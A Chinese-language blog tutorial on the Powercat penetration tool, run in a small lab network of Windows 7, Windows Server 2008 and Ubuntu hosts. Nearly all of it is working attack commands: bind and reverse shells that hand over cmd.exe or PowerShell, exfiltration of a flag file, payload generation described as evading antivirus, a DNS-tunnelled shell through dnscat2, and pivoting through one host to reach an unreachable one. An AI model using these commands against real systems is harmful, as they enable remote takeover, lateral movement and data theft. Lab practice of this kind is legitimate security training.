渗透工具-Powercat

发表于 2020-01-28 | 分类于 工具 | | 阅读次数:

Powercat就是一个Windows版本的NC,短小精悍，没有什么好介绍的，直接进入主题。

环境准备

  1. Powercat: https://github.com/besimorhino/powercat.git

    只需克隆仓库即可

git clone https://github.com/besimorhino/powercat.git

  1. Dnscat2: https://github.com/iagox86/dnscat2.git

    需要安装有ruby环境

git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
gem install bundler
bundle install

测试环境介绍

操作系统 IP地址
Windows Server 2008 192.168.130.100
Windows 7 192.168.130.150
192.168.227.161
Ubuntu 18.04 192.168.227.129
  • Windows 7 可访问另外两台机器
  • ubuntu和server 2008网络不可达

具体场景及操作

场景一: Ubuntu正向连接windows 7

Windows 7 下执行（注意执行权限的绕过）:

Powercat -l -p 8080 -e cmd.exe -v

Ubuntu 下执行:

nc 192.168.227.161 8080 -vv

场景二: Ubuntu反向链接Windows7

Ubuntu下执行:

nc -l -p 8080 -vv

Window 7 下执行:

powercat -c 192.168.227.129 -p 8888 -v -e cmd.exe

场景三: Windows 7反向连接Windows server 2008并返回 Powershell

此场景需要两台Windows的机器:

Windows 7 下执行:

powecat -l -p 8080 -v

Window server 2008 下执行:

powercat -c 192.168.130.150 -p 8080 -v -ep

Windows 7:

场景四：Powercat文件传输

Windows Server 2008的C盘根目录下有个flag.txt。使用Powercat来传输这个文件。

在Windows 7下执行:

powercat -l -p 8080 -of c:\Users\ctfwin7\Desktop\flag.txt -v

Windows Server 2008 下执行:

Powercat -c 192.168.130.150 -p 8080 -i c:\flag.txt -v

返回结果如下:

Windows Server 2008

Window 7

这里需要注意的是，Window Server 2008传输完成后并不会终端连接，我在后面特地加了一行回车，跟321这几个字符串，一并写入到了windows 7接受的flag.txt文件。如果不想增加内容，使用ctrl+c中断即可。

场景五: powercat生成Payload(躲避杀软)

Powercat生成payload也是有正反向的区分的。

WIndows 7:

powercat -l -p 8080 -e cmd -v -g >> shell.ps1

将生成的shell.ps1拿到Windows server 2008下

Windows Server 2008

./shell.ps1

Window7:

windows Server 2008:

PS: 也可以使用-ge 生成编码后的脚本，然后直接使用Powershell -E shellcode执行。

场景六: Powercat - DNS协议

Kali(Ubuntu下没法用dnscat，ubuntu自带一个53端口的程序，两个机器的IP是一样的)下执行:

ruby dns2.rb ms08067.test -e open –no-cache

Windows 7 下执行:

powercat -c 192.168.227.129 -p 53 -dns ms08067.test -e cmd.exe

场景七: Powercat 转发:

在我们设计的场景中Windows server 2008 和 ubuntu是无法直接通信的，但是使用windows 7作为跳板就可以达到这样的目的:

Windows 2008 Server下执行:

Powercat -l -v -p 9999 -e cmd.exe

WIndows 7 下执行:

Powercat -l -v -p 8000 -r tcp:192.168.130.100:9999

Ubuntu 下执行:

nc 192.168.227.161 8000 -vv

场景七-二 Powercat转发-DNS协议

跟上面的场景一样，唯一不同的是本次走的是DNS协议

Kali跟之前一样，运行dnscat即可:

ruby dns2.rb ms08067.test -e open –no-cache

Windows 7:

powercat -l -p 9999 -r dns:192.168.227.129::ms08067.test

Windows Server 2008下执行:

powercat -c 192.168.130.150 -p 9999 -e cmd.exe -v
